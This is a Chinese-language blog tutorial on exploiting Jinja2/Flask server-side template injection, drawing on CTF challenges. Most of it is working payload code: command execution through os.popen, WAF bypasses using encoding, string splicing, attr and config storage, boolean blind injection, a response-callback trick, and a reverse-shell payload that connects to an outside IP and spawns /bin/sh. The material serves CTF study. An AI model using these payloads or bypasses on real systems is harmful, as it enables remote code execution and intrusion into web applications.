---
title: python模板注入漏洞深度解析，从成因到简单利用，从简单利用到绕过，从回显到盲注
description: 该文章详细记录了大量关于jinja2模板引擎中模板注入漏洞的成因和利用方式，以及绕过技巧和盲注方式
date: 2024-12-18
image: cover.png
categories:
    - cate1
tags:
    - Python SSTI
---

## 模板注入漏洞成因

​	模板注入漏洞的造成是由于在程序设计时，没有将用户传入的参数进行适当的处理再插入模板中，而是直接将用户的参数嵌入到模板中，从而导致漏洞。

​	以下是一个简单的模板注入漏洞的示例：

```python
@app.route('/ssti-nowaf')
def ssti_nowaf():
    return render_template_string(request.args.get('payload'))
```

​	从这个示例中我们可以看到，这里直接将用户输入的字符串插入到模板字符串中，导致了模板注入漏洞。比如我们传入参数。

```http
payload={{'a'*7}}
```

​	页面将会返回

```http
aaaaaaa
```

​	![image-20241218104815804](/image-20241218104815804.png)

​	可见，python中的模板注入漏洞会导致用户可以执行任意的python代码。

## 模板注入漏洞利用

​	我们已知，当存在模板注入漏洞时我们可以执行任意的python代码，那么我们的下一步就是利用python代码执行命令，而在python代码中，如果要执行命令，我们的首先想到的就是寻找os模块，利用其中的popen方法进行命令执行。那么根据python的特性，我们要获取os中的popen模块，通常可以采用如下方法：

```python
num=0
for item in ''.__class__.__base__.__subclasses__() :
	try :
		if 'os' in item.__init__.__globals__ :
			print(num)
		num+=1
	except :
		num+=1
		continue
```

​	使用该python代码，即可在本地寻找os模块，我们稍作修改，即可在模板注入漏洞中利用它来尝试寻找靶机中的os模块。

```python
{%set%20item=''.__class__.__base__.__subclasses__()[1]%}
{%if%20'os'%20in%20item.__init__.__globals__%}
	{%print(item.__init__.__globals__)%}
{%endif%}
```

​	放入BP中爆破：

![image-20241218115144061](/image-20241218115144061.png)

​	可以看到还是有很多地方有os模块的，我们选择第一个306，构造payload：

```python
{{''.__class__.__base__.__subclasses__()[306].__init__.__globals__['os']['popen']('whoami').read()}}
```

​	以上就是一个简单的pythonssti的利用过程，我们接下来对针对这个payload进行解释。

```python
''.__class__
```

​	这一步是在利用字符串类的魔术方法，去获取他的类对象。这里还可以使用除字符串以外的其他类型比如元组，数组。

![image-20241218115604550](/image-20241218115604550.png)

```python
''.__class__.__base__
```

​	这一步是获取基类，这一步是很多payload的重要步骤，因为我们如果想要调用os方法就需要通过基类去获取。

![image-20241218115921452](/image-20241218115921452.png)

​	接下来就是获取他的所有子类。

```python
''.__class__.__base__.__subclasses__()
```

​	![image-20241218120047507](/image-20241218120047507.png)

​	再使用前面所提供的查找os模块的代码，找到os模块的下标后初始化，获取全局变量，使用os中的popen方法进行命令执行。

```python
''.__class__.__base__.__subclasses__()[306].__init__.__globals__['os']['popen']('whoami')
```

![image-20241218120320979](/image-20241218120320979.png)

​	再使用read方法把结果回显到前端。

```python
''.__class__.__base__.__subclasses__()[306].__init__.__globals__['os']['popen']('whoami').read()
```

​	![image-20241218120506983](/image-20241218120506983.png)

​	这就是一个简单的利用步骤了。

## 模板注入漏洞绕过

​	上面的所有步骤均为无拦截的情况，在实战中不可能这简单，所以接下来就是一些简单的绕过技巧。以下是官方对模板语法的介绍：

```python
{% ... %} for Statements 

{{ ... }} for Expressions to print to the template output

{# ... #} for Comments not included in the template output

#  ... # for Line Statements
```

​	以下为示例：

```python
{% set x= 'abcd' %}  声明变量
{% for i in ['a','b','c'] %}{{i}}{%endfor%} 循环语句
{% if 25==5*5 %}{{1}}{% endif %}  条件语句
```

### '{{}}'绕过

​	当拦截了'{{'和'}}'时，我们可以用'{%%}'进行绕过，示例：

```python
{{config}}
#绕过
{%print(config)%}
```

### '.'绕过

​	当'.'被拦截时，可以使用'[]'或者|attr()绕过，以下为示例：

```python
{{''.__class__}}
#使用'[]'绕过'.'
{{''['__class__']}}
{{''|attr('__class__')}}
```

### '[]'绕过

​	当'[]'被拦截，可使用getitem()和绕过

```python
{{''.__class__.__base__.__subclasses__()[306]}}
{{''.__class__.__base__.__subclasses__().__getitem__(306)}}
```

### request方法绕过

​	当某些特定的字符或者单引号被拦截时，可以采用request的方法绕过

```python
{{[]['__class__']}}
#GET传参a=__class__
{{[][request.args.a]}}
```

​	除去GET参数，还有其他的方法可以获取参数，这里仅贴出一部分:

```python
request.args.key  #获取get传入的key的值
request.form.key  #获取post传入参数(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
reguest.values.key  #获取所有参数，如果get和post有同一个参数，post的参数会覆盖get
request.cookies.key  #获取cookies传入参数
request.headers.key  #获取请求头请求参数
request.data  #获取post传入参数(Content-Type:a/b)
request.json  #获取post传入json参数 (Content-Type: application/json)
```

### '_'绕过

​	我们已知

```python
{{''|attr('__class__')}}
#等效
{{''.__class__}}
```

​	同时，在attr和'[]'中，字符可以使用编码来代替：

#### Unicode编码绕过

​	\u005f='_'

​	所以，我们可以这样构造payload

```python
{{''|attr('\u005f\u005fclass\u005f\u005f')}}
{{''['\u005f\u005fclass\u005f\u005f']}}
```

#### 十六进制编码绕过

​	\x5f='_'

​	所以可以这样构造payload

```python
{{''|attr('\x5f\x5fclass\x5f\x5f')}}
{{''['\x5f\x5fclass\x5f\x5f']}}
```

​	其他编码也可以实现同样的效果。

#### 格式化字符串

​	在python中

```python
print("%c%cclass%c%c"%(95,95,95,95))
#输出__class__
```

​	所以我们可以构造如下payload

```python
{{()|attr("%c%cclass%c%c"%(95,95,95,95))}}
#等效于
{{()|attr("__class__")}}
```

### 关键字绕过

#### 字符串拼接绕过

​	在python中

```python
print('o'+'s')
#输出os
```

​	假设过滤了关键字class、base、os、popen，我们可以构造如下payload:

```python
{{''['__cla'+'ss__']['__ba'+'se__']['__subclass'+'es__']()[306]['__in'+'it__']['__glob'+'als__']['o'+'s']['po'+'pen']('who'+'ami')['re'+'ad']()}}
```

### 数字过滤绕过

​	假设过滤了数字，我们可以采用内置方法length和int获取数字，如果长度有所限制，则可以搭配request对象来绕过：

```python
{%set a='aaaa'|length%}{%print(a)%}#输出整型4
{%set a=request.args.a|int%}{%print(a)%}#GET参数传入123，输出整型123
{{''.__class__.__base__.__subclasses__().__getitem__(request.args.a|int)}}#GET参数输入306，获取到第306个子类
```

### 长度绕过

#### 使用长度较短的payload：

​	这里我先给出一个简单的示例

##### 原题：imaginaryCTF 2022 - SSTI Golf

```python	
@app.route('/length-limiti')
def ssti():
    query = request.args['query'] if 'query' in request.args else '...'
    print(len(query))
    if len(query) > 49:
        return "Too long!"
    return render_template_string(query)
```

​	在这个示例中，限制了长度为49，如果使用之前提到的方式去注入，显然会出现过长的情况。所以这里要使用其他的方式进行注入，比如使用Flask内置的全局函数。

​	**url_for**：此函数全局空间下存在 **eval()** 和 **os 模块**

​	**lipsum**：此函数全局空间下存在 **eval()** 和 **os 模块**

```python
{{url_for.__globals__.os.popen('whoami').read()}}
{{lipsum.__globals__.os.popen('whoami').read()}}
```

![image-20241218123117627](/image-20241218123117627.png)

#### 将payload保存在config中

​	我们已知config实际上是一个保存了全局变量的字典：

![image-20241218123401297](/image-20241218123401297.png)

​	那么我们就可以使用赋值的方式将payload保存在config中。而set方法则是设置变量，所以我们可以实现如下操作：

![image-20241218123641662](/image-20241218123641662.png)

​	可以看到，s:string被保存到了config中，所以我们可以将payload保存在config中，以此绕过长度限制。以下是一个简单的示例：

##### 原题：imaginaryCTF 2022 - minigolf

```python
@app.route('/config-bypass', methods=['GET'])
def config_bypass():
    blacklist = ["{{", "}}", "[", "]", "_"]
    print(request.args)
    if "txt" in request.args.keys():
        txt = html.escape(request.args["txt"])
        if any([n in txt for n in blacklist]):
            return "Not allowed."
        if len(txt) <= 69:
            return render_template_string(txt)
        else:
            return "Too long."
    return Response(open(__file__).read(), mimetype='text/plain')
```

​	分析代码可知，这里将长度限制在69，且拦截部分关键词，这里我们对拦截的关键词进行简单的绕过：

'{{'和'}}'：这里拦截了花括号，我们可以使用{%%}绕过。

'['和']'：这里拦截可中括号，导致我们无法调用对象方法，我们可以使用attr()过滤器来代替。

'_'：拦截了下划线，导致我们无法调用魔术方法，这里可以使用attr()配合字符编码或者从request对象中获取参数来绕过。

​	在明晰了绕过方法后，我们先选择payload，基于这个payload的去构造config：

```python
{{lipsum.__globals__.os.popen('whoami').read()}}
```

​	由于url_for中有一个下划线，所以这里我们选择lipsum方法。我们先将lipsum放入config中

```python
{%set%20x=config.update(l=lipsum)%}
```

​	![image-20241218125208854](/image-20241218125208854.png)

​	然后把globals放入config中，这里由于下划线被拦截，所以我们利用request对象绕一下。

```python
{%set%20x=config.update(c=request.args.g)%}{%print(config)%}&g=__globals__
```



![image-20241218125507640](/image-20241218125507640.png)

​	 利用放入了config配置文件中的globals字符串获取全局方法，并放入config中：

```python
{%set%20x=config.update(f=config.l|attr(config.c))%}{%print(config)%}
```

​	这里使用了attr去绕过了[]，不使用'.'是因为config.l使用了'.'再使用点会导致语法错误。

![image-20241218132923973](/image-20241218132923973.png)

​	然后就是获取os模块：

```python
{%set%20x=config.update(o=config.f.os)%}{%print(config)%}
```

​	![image-20241218133223143](/image-20241218133223143.png)

​	获取popen方法：

```python
{%set%20x=config.update(p=config.o.popen)%}{%print(config)%}
```

​	![image-20241218133344217](/image-20241218133344217.png)

​	然后就可以进行命令执行了：

```python
txt={%print(config.p(request.args.a).read())%}&a=whoami
```

​	![image-20241218133501552](/image-20241218133501552.png)

### 盲注

​	上述所有的讨论都是在有回显的情况下进行的注入，但是比赛中并不是所有题目都会给出回显，而针对没有回显的情况一般就几种方式，盲注，写文件，弹shell，或者用钩子函数外带结果，这里先介绍盲注和钩子函数。

#### 布尔盲注

这里给出一个简单的示例：

##### 原题：第十八届全国大学生信息安全竞赛（创新实践能力赛）暨第二届“长城杯”铁人三项赛（防护赛）- Safe_Proxy

```python
@app.route('/', methods=["POST"])
def template():
    template_code = request.form.get("code")
    # 安全过滤
    blacklist = ['__', 'import', 'os', 'sys', 'eval', 'subprocess', 'popen', 'system', '\r', '\n']
    for black in blacklist:
        if black in template_code:
            return "Forbidden content detected!"
    result = render_template_string(template_code)
    print(result)
    return 'ok' if result is not None else 'error'
```

​	这里是一个显然的盲注，因为渲染的结果没有返回到前端中，且这里还拦截了一些关键字，我们开始分析：

import，os，sys，eval，subprocess，popen，system：这些关键字的拦截我们可以使用字符串拼接绕过的方式来实现绕过。

__：针对下划线的绕过我们可以采用十六进制编码绕过。

\r，\n：这两个拦截是凑字数的，没有任何的作用。

​	这里我们已知结果不会返回前端，那么我们就需要使用盲注，这里先使用布尔盲注，写出payload：

```python
{%set+allchar="abcdefghijklmnopqrstuvwxyz0123456789!@#$%^%26*()-_+{}[]|:;?/><.,ABCDEFGHIJKLMNOPQRSTUVWXYZ"%}
{%set+a='os'%}
{%set+b='popen'%}
{%set+res=url_for['__globals__'][a][b]('whoami').read()%}
{%if+res[0]==allchar[0]%}
	{%print(1)%}
{%else%}
	{%print(sleep(1))%}
{%endif%}
```

​	绕过关键字

```python
{%set+allchar="abcdefghijklmnopqrstuvwxyz0123456789!@#$%^%26*()-_+{}[]|:;?/><.,ABCDEFGHIJKLMNOPQRSTUVWXYZ"%}
{%set+a='o'+'s'%}
{%set+b='po'+'pen'%}
{%set+res=url_for['__globals__'][a][b]('whoami').read()%}
{%if+res[0]==allchar[0]%}
	{%print(1)%}
{%else%}
	{%print(sleep(1))%}
{%endif%}
```

​	绕过下划线

```python
{%set+allchar="abcdefghijklmnopqrstuvwxyz0123456789!@#$%^%26*()-_+{}[]|:;?/><.,ABCDEFGHIJKLMNOPQRSTUVWXYZ"%}
{%set+a='o'+'s'%}
{%set+b='po'+'pen'%}
{%set+res=url_for['\x5f\x5fglobals\x5f\x5f'][a][b]('whoami').read()%}
{%if+res[0]==allchar[0]%}
	{%print(1)%}
{%else%}
	{%print(sleep(1))%}
{%endif%}
```

​	简单解释一下，该payload首先把所有字符都放在了一个字符串中，便于爆破，然后定义了os和popen字符串，在通过url_for这个内置方法执行命令，并把结果存入到res中。最后通过if去爆破字符串，当相同时程序正常执行，当不同时程序出现异常报错，从而达到猜出字符串的目的。

![image-20241218151642759](/image-20241218151642759.png)

​	得到爆破后的结果，用脚本处理一下。

```python
x='abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_+{}[]|:;?/><.,ABCDEFGHIJKLMNOPQRSTUVWXYZ'
def read_and_process_data(file_path):
    extracted_data = []
    with open(file_path, mode='r', encoding='utf-8') as file:
        for line in file:
            parts = line.strip().split('\t')
            if len(parts) >= 3:
                second_col = parts[1]
                third_col = int(parts[2])
                extracted_data.append((second_col, third_col))
    sorted_data = sorted(extracted_data, key=lambda x: int(x[0]))
    #print(sorted_data)
    return sorted_data
def write_to_file(ascii_data, output_file):
    with open(output_file, mode='w', encoding='utf-8') as file:
        file.write(''.join(ascii_data))
def main():
    input_file = 'data.txt'
    #output_file = 'res.txt'
    sorted_data = read_and_process_data(input_file)
    print(sorted_data)
    for _i,k in sorted_data:
        print(x[k],end='')

if __name__ == "__main__":
    main()
```

​	![image-20241218151757183](/image-20241218151757183.png)

#### 钩子函数回显

这里给出一个简单示例：

##### 原题：2024“国城杯”网络安全挑战大赛-Ez_Gallery

```python
def shell_view(request):
    expression = request.GET.get('shellcmd', '')
    blacklist_patterns = [r'.*length.*',r'.*count.*',r'.*[0-9].*',r'.*\..*',r'.*soft.*',r'.*%.*']
    if any(re.search(pattern, expression) for pattern in blacklist_patterns):
        return Response('wafwafwaf')
    try:
        result = jinja2.Environment(loader=jinja2.BaseLoader()).from_string(expression).render({"request": request})
        if result != None:
            return Response('success')
        else:
            return Response('error')
    except Exception as e:
        return Response('error')
```

​	这里可以看到，渲染的结果是没有被返回的，也就是不存在回显，再分析一下waf

%：也就是把if，set给ban，上一个示例的方法也就行不通了。

length,count,[0-9],soft：把关键字和数字ban掉了，数字这里可以用request+int来绕，不过也可以采用不需要数字的方法来绕。

..：这里是把'.'给ban了，可以用中括号绕也可以用|attr绕过。

​	这里着重介绍钩子函数回显，先构造payload：

```python
{{cycler.__init__.__globals__.__builtins__['exec']("request.add_response_callback(lambda%20request,response:setattr(response,'text',__import__('os').popen('whoami').read()))",{'request':request})}}
```

​	解析：这里是通过内置方法cycler，初始化，获取全区变量，获取所有内置函数，来获取exec方法，然后传入参数：

```python
"request.add_response_callback(lambda%20request,response:setattr(response,'text',__import__('os').popen('whoami').read()))"
{'request':request}
```

​	其中exec是一个执行python代码的方法，所这里的字符串就是要执行的python代码，这里的request就是要执行的python代码要传入的参数，这里的大意是，执行request类下的add_reponse_callback方法，前面是请求体，后面的response则是设置响应体和设置响应体的结果，这样就会将结果直接返回到前端中。接下来我们绕过一下'.'

```python
{{cycler['__init__']['__globals__']['__builtins__']['exec']("getattr(request,'add_response_callback')(lambda%20request,response:setattr(response,'text',getattr(getattr(__import__('os'),'popen')('whoami'),'read')()))",{'request':request})}}
```

![image-20241218162320046](/image-20241218162320046.png)

#### 	反弹shell

​	这种方式的前提是靶机能出网，我们使用上一个示例，构造payload，这里不再详细解析了：

```python
{{lipsum|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')(request|attr('POST')|attr('get')('shell'))}}
#post传参
#shell=__import__('os').system('python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("61.139.2.128",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")\'')
```

​	![image-20241218162908445](/image-20241218162908445.png)

​	![image-20241218162944530](/image-20241218162944530.png)

## 参考文献

[最全SSTI模板注入waf绕过总结（6700+字数！）_ssti注入绕过-CSDN博客](https://blog.csdn.net/2301_76690905/article/details/134301620?ops_request_misc=%7B%22request%5Fid%22%3A%22ebffad6090e65ad2a71a5b5fdc9acae6%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=ebffad6090e65ad2a71a5b5fdc9acae6&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-134301620-null-null.142^v100^pc_search_result_base6&utm_term=python模板注入绕过&spm=1018.2226.3001.4187)

[Python模板注入(SSTI)深入学习 - 先知社区](https://xz.aliyun.com/t/6885?time__1311=n4%2BxnD0Dg7excGDRDBqroGkDu7Qfpte4Dk0eD)

[Python Flask SSTI 之 长度限制绕过_python绕过长度限制的内置函数-CSDN博客](https://blog.csdn.net/weixin_43995419/article/details/126811287)

[第十八届全国大学生信息安全竞赛（创新实践能力赛）暨第二届“长城杯”铁人三项赛（防护赛）个人WP](https://hadagaga.github.io/p/第十八届全国大学生信息安全竞赛创新实践能力赛暨第二届长城杯铁人三项赛防护赛个人wp/)

https://docs.pylonsproject.org/projects/pyramid/en/1.4-branch/narr/hooks.html

[【Web】2024“国城杯”网络安全挑战大赛题解-CSDN博客](https://blog.csdn.net/uuzeray/article/details/144333686)